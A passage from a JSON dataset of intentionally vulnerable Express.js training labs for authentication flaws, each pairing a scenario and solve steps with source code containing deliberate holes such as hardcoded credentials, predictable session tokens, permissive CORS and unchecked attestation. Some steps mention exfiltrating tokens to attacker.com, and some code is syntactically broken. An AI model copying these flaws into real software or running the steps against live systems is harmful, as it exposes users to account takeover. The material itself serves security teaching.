{\n  const { token, new_password } = req.body;\n  if (users[token]) {\n    users[token] = new_password;\n    res.send('Password reset successfully');\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Password Reset Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypass Certificate-Based Autnenticationvia Forged Client-Side TLS Verification",
      "labDescription": "This lab implements flawed certificate pinning where client certificate validation only checks the public key rather than full certificate chain. Attackers can forge certificates using extracted public keys to impersonate administrators. To solve the lab: 1. Obtain the server's pinned public key from /security.txt. 2. Generate a malicious certificate matching the public key. 3. Authenticate using the forged certificate to access the /audit/reports endpoint and delete all audit logs.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst fs = require('fs');\nconst spdy = require('spdy');\nconst app = express();\n\n// Server configuration\nconst pinnedPublicKey = fs.readFileSync('./pinned-key.pub', 'utf8');\nconst authorizedUsers = ['CN=admin'];\n\n// Vulnerable TLS middleware\napp.use((req, res, next) => {\n  const cert = req.socket.getPeerCertificate();\n  \n  if (!cert || !cert.raw) {\n    return res.status(401).send('Client certificate required');\n  }\n\n  // Critical flaw: Only compares public keys\n  const clientPublicKey = cert.publicKey.export({ type: 'spki', format: 'pem' });\n  if (clientPublicKey !== pinnedPublicKey) {\n    return res.status(403).send('Invalid certificate');\n  }\n\n  // Secondary flaw: Subject validation bypass\n  req.isAdmin = cert.subject.CN === 'admin';\n  next();\n});\n\napp.get('/audit/reports', (req, res) => {\n  if (!req.isAdmin) return res.status(403).send('Admin required');\n  res.send('AUDIT CONTROLS: <button onclick=\"fetch('/audit/purge')\">DELETE ALL</button>');\n});\n\napp.post('/audit/purge', (req, res) => {\n  res.send('All audit logs destroyed - Lab solved');\n});\n\n// Expose public key (simulate security misconfiguration)\napp.get('/security.txt', (req, res) => {\n  res.send(pinnedPublicKey);\n});\n\nspdy.createServer({\n  key: fs.readFileSync('./server.key'),\n  cert: fs.readFileSync('./server.crt'),\n  requestCert: true,\n  rejectUnauthorized: false // Critical: Accepts self-signed certs\n}, app).listen(4000, () => {\n  console.log(`Certificate Lab running on https://localhost:4000`);\n});"
  },
  {
      "labScenario": "Predictable Cookie-Based Session Hijacking",
      "labDescription": "This lab uses a predictable cookie value derived from the username to authenticate users. The cookie format is 'user-<username>'. Attackers can impersonate other users by knowing their usernames and constructing the corresponding cookie value. To solve the lab, access another user's profile by manipulating the cookie value.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'alice', password: 'password123' }, { username: 'bob', password: 'password456' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); // Set predictable cookie res.cookie('auth', 'user-' + user.username); res.send('Welcome, ' + username); }); app.get('/profile', (req, res) => { const authCookie = req.cookies.auth; if (!authCookie) return res.status(401).send('Unauthorized'); const parts = authCookie.split('-'); if (parts[0] !== 'user' || parts.length !== 2) return res.status(401).send('Invalid cookie'); const username = parts[1]; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + username); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Cookie Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Exploit a web application with a weak password policy that allows users to set very short or predictable passwords, making them easy to guess.",
      "labDescription": "The application has a login page where users can authenticate with a username and password. However, it enforces no minimum password length or complexity requirements. This allows an attacker to guess the password of a user by trying common or short passwords, such as '123' or 'password'. Your task is to: 1. Attempt to log in as the user 'admin' by guessing their password. 2. Use simple, common passwords (e.g., 'admin', '123', or 'pass') until you succeed. 3. Once logged in, access the protected '/dashboard' page to confirm the exploit. This lab demonstrates the importance of enforcing strong password policies (e.g., minimum length, mix of characters) to prevent attackers from easily guessing credentials. Hint: Try short or predictable passwords that someone might use if no rules are enforced.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = { 'admin': '123' }; // Weak password!\n\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><br><input name=\"password\" type=\"password\" placeholder=\"Password\"><br><button type=\"submit\">Login</button></form>');\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful! <a href=\"/dashboard\">Go to Dashboard</a>');\n  } else {\n    res.status(401).send('Invalid username or password');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  res.send('Welcome to the Admin Dashboard!');\n});\n\nconst PORT = 5000;\napp.listen(PORT, () => console.log(`Weak Password Policy Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypass FIDO2 Autnenticationvia Forged Attestation Statements",
      "labDescription": "This lab's WebAuthn implementation fails to properly validate authenticator attestation data, allowing attackers to register malicious security keys as admin devices. To solve: 1. Intercept WebAuthn registration traffic. 2. Forge attestation statement using software emulated authenticator. 3. Bypass admin privilege checks by manipulating credential ID format. 4. Access /control-panel to disable security systems.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst { WebAuthn } = require('node-webauthn');\nconst app = express();\napp.use(bodyParser.json());\n\nconst webauthn = new WebAuthn({\n  rpName: 'Vulnerable Corp',\n  rpID: 'localhost',\n  origin: 'http://localhost:4000',\n  attestation: 'direct',\n  // Critical flaw: No attestation format validation\n  supportedAlgorithmIDs: [-7, -257]\n});\n\nconst users = [{\n  id: 'admin',\n  credentials: [],\n  role: 'user'\n}];\n\napp.post('/webauthn/register', async (req, res) => {\n  const options = webauthn.generateRegistrationOptions({\n    userID: 'attacker',\n    userName: 'attacker',\n    // Vulnerability: Accepts any authenticator type\n    authenticatorSelection: { userVerification: 'discouraged' }\n  });\n\n  req.session.challenge = options.challenge;\n  res.json(options);\n});\n\napp.post('/webauthn/register/complete', async (req, res) => {\n  const result = await webauthn.verifyRegistration({\n    credential: req.body,\n    expectedChallenge: req.session.challenge,\n    expectedOrigin: 'http://localhost:4000',\n    // Critical flaw: Disabled attestation verification\n    requireUserVerification: false\n  });\n\n  // Vulnerability: Privilege escalation via credential ID pattern\n  if (result.credentialID.toString('hex').startsWith('admin')) {\n    users[0].role = 'admin';\n  }\n\n  res.send('Registration successful');\n});\n\napp.get('/control-panel', (req, res) => {\n  if (users[0].role !== 'admin') return res.status(403).send('Access denied');\n  res.send('SECURITY CONTROLS: <button onclick=\"fetch('/shutdown')\">DISABLE ALL</button>');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`WebAuthn Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Steal OAuth Tokens through Promiscuous CORS Configuration",
      "labDescription": "This lab's OAuth provider has insecure CORS settings allowing arbitrary origins to retrieve access tokens. Exploit: 1. Lure victim to malicious site loading cross-origin iframe. 2. Use XHR from attacker.com to /oauth/userinfo. 3. Exfiltrate tokens via DNS prefetch. 4. Access /api/admin to revoke all 2FA settings. The lab uses refresh_token grant with long-lived tokens.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\n\napp.use(cors({\n  // Critical flaw: Reflects arbitrary origin with credentials\n  origin: (origin, callback) => callback(null, true),\n  credentials: true\n}));\n\nconst tokens = new Map();\ntokens.set('admin_token', { \n  user: 'admin',\n  scope: ['admin'],\n  expires: Date.now() + 31536000000 // 1 year expiration\n});\n\napp.get('/oauth/userinfo', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const session = tokens.get(token);\n  \n  if (!session) return res.status(401).send('Invalid token');\n  res.json({\n    user: session.user,\n    scope: session.scope,\n    // Vulnerability: Returns sensitive metadata\n    security: { 2fa_enabled: false }\n  });\n});\n\napp.post('/api/admin/disable-2fa', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (!tokens.get(token)?.scope.includes('admin')) {\n    return res.status(403).send('Admin required');\n  }\n  res.send('All 2FA disabled - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`CORS Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Exploit a weak password policy to guess a user's password.",
      "labDescription": "The application enforces a weak password policy that allows very short and simple passwords (e.g., minimum 3 characters, no complexity requirements). Your task is to guess the password for the user 'user1' and log into their account. Hint: The password is a common three-letter word.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated database with user credentials\nconst users = { 'user1': 'cat', 'admin': 'dog' };\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\nconst PORT = 8000;\napp.listen(PORT, () => console.log(`Weak Password Policy Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Exploit hardcoded credentials to log in as an admin user.",
      "labDescription": "The application contains hardcoded credentials embedded in its source code. Your task is to examine the code, identify the admin username and password, and use them to log in. Once successful, you'll see a welcome message confirming your access as an admin.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hardcoded admin credentials\nconst ADMIN_USERNAME = 'admin';\nconst ADMIN_PASSWORD = 'secret123';\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {\n    res.send(`Welcome, ${username}! You have admin access.`);\n  } else {\n    res.status(401).send('Login failed: Incorrect username or password');\n  }\n});\n\nconst PORT = 9000;\napp.listen(PORT, () => console.log(`hardcoded Credentials Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Unauthorized File Access via IDOR",
      "labDescription": "This lab allows attackers to download sensitive files by manipulating the file ID parameter in the download endpoint. The application does not validate whether the user is authorized to access the requested file. To solve the lab, download a restricted file by guessing its ID.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const files = { 1: { id: 1, name: 'user1_file.txt', content: 'User 1 data' }, 2: { id: 2, name: 'admin_file.txt', content: 'Admin data' } }; app.get('/download/:fileId', (req, res) => { const fileId = parseInt(req.params.fileId); const file = files[fileId]; if (!file) return res.status(404).send('File not found'); res.send(file.content); }); const PORT = 4000; app.listen(PORT, () => console.log('IDOR File Download Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Session Reuse After Logout",
      "labDescription": "This lab's logout functionality does not properly invalidate the session, allowing attackers to reuse the session cookie even after the user has logged out. To solve the lab, intercept the session cookie, force the user to log out, then use the same cookie to access their account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.post('/login', (req, res) => { req.session.user = 'alice'; res.send('Logged in'); }); app.post('/logout', (req, res) => { // Vulnerability: Session not invalidated req.session.user = null; res.send('Logged out'); }); app.get('/profile', (req, res) => { if (req.session.user) res.send('Welcome, alice!'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Reuse Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Session ID Predictability via User Email",
      "labDescription": "This lab generates session IDs using the user's email address (e.g., 'session-' + email). Attackers can impersonate users by knowing their email and constructing the corresponding session ID. To solve the lab, access another user's profile using their email-derived session ID.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = [{ email: 'user@example.com', password: 'password123' }, { email: 'admin@example.com', password: 'admin456' }]; app.post('/login', (req, res) => { const { email, password } = req.body; const user = users.find(u => u.email === email && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.cookie('session', 'session-' + user.email); res.send('Welcome!'); }); app.get('/profile', (req, res) => { const session = req.cookies.session; const user = users.find(u => 'session-' + u.email === session); if (!user) return res.status(401).send('Unauthorized'); res.send('Profile for ' + user.email); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Session ID Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Unauthorized Email Update via API",
      "labDescription": "This lab's API endpoint allows attackers to update any user's email by including the target user's ID in the request body. The backend does not validate authorization. To solve the lab, change another user's email using their ID.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, email: 'user@example.com' }, { id: 2, email: 'admin@example.com' }]; app.post('/update-email', (req, res) => { const { userId, newEmail } = req.body; const user = users.find(u => u.id === userId); if (!user) return res.status(404).send('User not found'); user.email = newEmail; res.send('Email updated to ' + newEmail); }); const PORT = 4000; app.listen(PORT, () => console.log('Missing Authorization Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Brute-Forceable Session IDs",
      "labDescription": "This lab uses a weak random number generator (Math.random()) to create 4-digit session IDs. Attackers can brute-force all possible IDs (0000-9999) to hijack sessions. To solve the lab, iterate through session IDs to find an active one.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); let sessionId = Math.floor(Math.random() * 9000) + 1000; // 4-digit ID app.get('/profile', (req, res) => { const userSession = req.query.session; if (userSession === sessionId.toString()) { res.send('Welcome! Active session: ' + sessionId); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Weak Randomness Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Hijack SAML Flows via Assertion Consumer Service Manipulation",
      "labDescription": "This lab's SAML IdP doesn't invalidate used assertions, allowing replay attacks. To solve: 1. Initiate SP-initiated SSO to capture SAMLRequest. 2. Modify `AssertionConsumerServiceURL` to attacker endpoint. 3. Replay assertion via original ACS URL. 4. Access /partner/data as federated admin.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst xmlCrypto = require('xml-crypto');\nconst xmldom = require('xmldom');\nconst xpath = require('xpath');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/saml/acs', (req, res) => {\n  try {\n    const SAMLResponse = Buffer.from(req.body.SAMLResponse, 'base64').toString();\n    const doc = new xmldom.DOMParser().parseFromString(SAMLResponse);\n    \n    // Extract assertion with XPath\n    const select = xpath.useNamespaces({\n      saml: 'urn:oasis:names:tc:SAML:2.0:assertion',\n      ds: 'http://www.w3.org/2000/09/xmldsig#'\n    });\n    \n    const assertion = select('//saml:Assertion', doc)[0];\n    const signature = select('//ds:Signature', doc)[0];\n\n    // Verify signature\n    const verifier = new xmlCrypto.SignedXml({ signatureAlgorithm: 'rsa-sha256' });\n    verifier.loadSignature(signature.toString());\n    \n    if (!verifier.checkSignature(assertion.toString())) {\n      return res.status(403).send('Invalid signature');\n    }\n\n    // Vulnerability: No assertion replay prevention\n    res.redirect('/partner/data');\n  } catch (error) {\n    res.status(500).send('SAML processing error');\n  }\n});\n\napp.get('/partner/data', (req, res) => {\n  res.send('FEDERATED DATA: Cross-tenant customer records');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`SAML Replay Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Predict HMAC-Based One-Time Passwords via State Manipulation",
      "labDescription": "This lab's 2FA system uses a flawed HMAC-SHA256 implementation where the nonce isn't properly randomized. Attackers can: 1. Capture two consecutive OTPs. 2. Reverse-engineer the HMAC key using length extension attacks. 3. Generate future OTPs to access /admin/backup. The nonce increments by 1 second but resets during password changes.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const crypto = require('crypto');\nconst express = require('express');\nconst app = express();\n\nlet hmacKey = crypto.randomBytes(32);\nlet nonce = Date.now();\n\napp.post('/2fa', (req, res) => {\n  const { code } = req.body;\n  const currentNonce = Math.floor(Date.now() / 1000);\n  \n  // Critical flaw: Reusable nonce window\n  const validCodes = [currentNonce - 1, currentNonce, currentNonce + 1]\n    .map(t => crypto.createHmac('sha256', hmacKey).update(t.toString()).digest('hex'));\n  \n  if (!validCodes.includes(code)) return res.status(401).send('Invalid code');\n  res.send('Admin dashboard unlocked');\n});\n\napp.post('/change-password', (req, res) => {\n  // Vulnerability: Resets nonce but preserves HMAC key\n  nonce = Date.now();\n  res.send('Password changed');\n});\n\napp.get('/admin/backup', (req, res) => {\n  res.send('SYSTEM BACKUP: Cryptographic keys archived');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OTP Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Steal Identity Tokens via OpenID Connect Misconfiguration",
      "labDescription": "This lab's OIDC implementation fetches JWKS keys from an attacker-controlled URL due to insecure `issuer` validation. Exploit: 1. Register a malicious OAuth client with `redirect_uri=http://attacker.com`. 2. Forge JWT with `iss` pointing to your server. 3. Capture the server's HTTP request to your JWKS endpoint containing privileged `kid` tokens. 4. Use leaked tokens to access /vault and decrypt secrets.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = [{\n  client_id: 'legacy-app',\n  jwks_uri: 'https://metadata.google.com/.well-known/jwks.json' // Default trusted\n}];\n\napp.post('/oauth/token', async (req, res) => {\n  const { assertion } = req.body;\n  const decoded = jwt.decode(assertion, { complete: true });\n  \n  // Critical flaw: Blindly trusts JWT `iss` claim\n  const client = clients.find(c => c.client_id === decoded.payload.iss);\n  const jwks = (await axios.get(client.jwks_uri)).data;\n  \n  // Vulnerability: No host validation for JWKS_URI\n  const key = jwks.keys.find(k => k.kid === decoded.header.kid);\n  const verified = jwt.verify(assertion, pemKey(key), { algorithms: ['RS256'] });\n  \n  res.json({ access_token: 'leaked_system_token' });\n});\n\napp.get('/vault', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token !== 'leaked_system_token') return res.status(403);\n  res.send('VAULT UNLOCKED: Root certificates extracted');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OIDC Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Predictable Reset Tokens Using Timestamps",
      "labDescription": "This lab generates password reset tokens using the current timestamp plus a fixed offset (e.g., 'token-' + (Date.now() + 10000)). Attackers can predict tokens by knowing when they were generated. To solve the lab, compute the reset token for the 'admin' account using the approximate timestamp.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); const users = { 'admin': { password: 'admin123', resetToken: null } }; app.post('/request-reset', (req, res) => { const { username } = req.body; const user = users[username]; if (!user) return res.status(404).send('User not found'); const timestamp = Date.now(); user.resetToken = 'token-' + (timestamp + 10000); res.send('Reset token generated'); }); app.post('/reset-password', (req, res) => { const { username, token, newPassword } = req.body; const user = users[username]; if (!user || user.resetToken !== token) return res.status(401).send('Invalid token'); user.password = newPassword; user.resetToken = null; res.send('Password reset'); }); const PORT = 4000; app.listen(PORT, () => console.log('Timestamp Token Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Unauthorized Role Modification",
      "labDescription": "This lab allows attackers to escalate privileges by modifying the 'role' parameter in API requests. The backend does not validate if the user is authorized to change roles. To solve the lab, change your role to 'admin' by tampering with the request.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, role: 'user' }, { id: 2, role: 'admin' }]; app.post('/update-role', (req, res) => { const { userId, newRole } = req.body; const user = users.find(u => u.id === userId); if (!user) return res.status(404).send('User not found'); user.role = newRole; res.send('Role updated to ' + newRole); }); const PORT = 4000; app.listen(PORT, () => console.log('Role Escalation Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Session ID Exposed in URL",
      "labDescription": "This lab stores the session ID in the URL instead of a secure cookie. Attackers can steal session IDs from server logs or shared URLs. To solve the lab, intercept another user's session ID from their URL and access their profile.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const app = express(); let sessionId = 'abc123'; app.get('/profile', (req, res) => { const userSession = req.query.session; if (userSession === sessionId) { res.send('Welcome! Active session: ' + sessionId); } else { res.status(401).send('Unauthorized'); } }); app.get('/login', (req, res) => { res.send(`Logged in. Your session ID is: ${sessionId}`); }); const PORT = 4000; app.listen(PORT, () => console.log('URL Session ID Lab running on http://localhost:' + PORT));"
  },
  {
      "labScenario": "Privilege Escalation via PAR Request URI Manipulation",
      "labDescription": "This OAuth 2.1 implementation mishandles Pushed Authorization Request URIs, allowing attackers to: 1. Intercept `request_uri` during client registration. 2. Replace scopes with `admin:full`. 3. Force authorization server to process modified request. 4. Access SCIM API to create backdoor admin account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst uuid = require('uuid');\nconst app = express();\n\nconst parRequests = new Map();\n\napp.post('/par', (req, res) => {\n  const { client_id, scope } = req.body;\n  const request_uri = `urn:ietf:params:oauth:request_uri:${uuid.v4()}`;\n  \n  // Critical flaw: No client-scope binding\n  parRequests.set(request_uri, {\n    client_id,\n    scope // Vulnerable: Attacker can override\n  });\n  \n  res.json({ request_uri, expires_in: 300 });\n});\n\napp.post('/authorize', (req, res) => {\n  const { request_uri } = req.body;\n  const request = parRequests.get(request_uri);\n  \n  // Vulnerability: Trusts unmodified PAR\n  if (request.scope.includes('admin:full')) {\n    res.redirect(`/scim/create-admin?client=${request.client_id}`);\n  } else {\n    res.send('Standard authorization granted');\n  }\n});\n\napp.post('/scim/create-admin', (req, res) => {\n  res.send('Backdoor admin created - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`PAR Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypass Facial Recognition via Stored Template Reuse",
      "labDescription": "This lab's biometric Autnenticationsystem stores facial recognition templates as static SHA-256 hashes. Attackers can: 1. Extract template hashes from insecure S3 bucket. 2. Replay admin's facial hash via API parameter. 3. Bypass liveness detection to access /biometric/safe. The system compares hashes without timestamp validation.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst facialHashes = {\n  admin: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4'\n};\n\napp.post('/verify-biometric', (req, res) => {\n  const { image, hash } = req.body;\n  \n  // Critical flaw: Accepts precomputed hashes\n  const computedHash = hash || crypto.createHash('sha256').update(image).digest('hex');\n  \n  // Vulnerability: No anti-replay mechanism\n  if (Object.values(facialHashes).includes(computedHash)) {\n    res.send('Autnenticationsuccessful');\n  } else {\n    res.status(403).send('Biometric mismatch');\n  }\n});\n\napp.get('/biometric/safe', (req, res) => {\n  res.send('BIOMETRIC VAULT: DNA profiles downloaded');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Biometric Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Exploit a weak password policy to guess a user's password.(Weak Password Policy)",
      "labDescription": "The application allows users to set very short and simple passwords with no complexity requirements. Try logging in as 'admin' by guessing a common password like '123'. This demonstrates how weak password policies can lead to unauthorized access.",
      "vulnerabilityName": "Autnentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = { 'admin': '123' };\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>');\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.listen(3001, () => console.log('Server running on port 3001'));"
  },
  {
      "labScenario": "Exploit insecure session management to reuse a session after logout. (Insecure Session Management)",
      "labDescription": "The application fails to properly invalidate session cookies upon logout. Log in as 'user1', capture the session cookie, log out, then use the same cookie to access the account page again. This shows the importance of fully destroying sessions on logout.",
      "vulnerabilityName": "Autnentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\nconst users = { 'user1': 'password' };\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>');\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    req.session.username = username;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\napp.get('/logout', (req, res) => {\n  req.session.username = null; // Not destroying the session\n  res.send('Logged out');\n});\napp.listen(3002, () => console.log('Server running on port 3002'));"
  },
  {
      "labScenario": "Exploit the lack of rate limiting to perform credential stuffing(Credential Stuffing)",
      "labDescription": "The application does not limit the number of login attempts, allowing attackers to try multiple passwords for a known username. Try logging in as 'user1' with different passwords until you guess 'password123'. This highlights the need for rate limiting or account lockouts.",
      "vulnerabilityName": "Autnentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = { 'user1': 'password123' };\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>');\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.send('Invalid credentials'); // No rate limiting\n  }\n});\napp.listen(3003, () => console.log('Server running on port 3003'));"
  },
  {
      "labScenario": "Registration without email verification",
      "labDescription": "A registration endpoint creates user accounts without verifying the email address. This allows attackers to create fake accounts without validation.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no email verification\napp.post('/register', (req, res) => {\n  const { username, email, password } = req.body;\n  // Simulate account creation without email verification\n  res.send(`User ${username} registered successfully with email ${email}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Insecure password recovery via static security question",
      "labDescription": "The password recovery endpoint uses a static security question with a hardcoded answer. An attacker can easily guess or know the answer to reset a user's password.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: static security question\napp.post('/recoverPassword', (req, res) => {\n  const { username, securityAnswer, newPassword } = req.body;\n  // The security question is always 'What is your favorite color?' and answer is hardcoded as 'blue'\n  if (securityAnswer === 'blue') {\n    res.send(`Password for ${username} reset to ${newPassword}`);\n  } else {\n    res.send('Security answer incorrect');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Social login without email verification",
      "labDescription": "A social login endpoint accepts user data from a third-party provider but does not verify the returned email address, allowing attackers to bypass proper account linking.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: social login does not verify email\napp.post('/socialLogin', (req, res) => {\n  const { provider, email } = req.body;\n  // Insecurely trusts the provided email\n  res.send(`Logged in with ${provider} account: ${email}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Default admin password in configuration",
      "labDescription": "The system loads administrative credentials from a configuration file that uses default values. An attacker who knows these defaults can gain admin access.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: default admin credentials exposed in code\nconst ADMIN_USER = 'admin';\nconst ADMIN_PASS = 'admin123';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === ADMIN_USER && password === ADMIN_PASS) {\n    res.send('Admin login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "URL-based session token exposure",
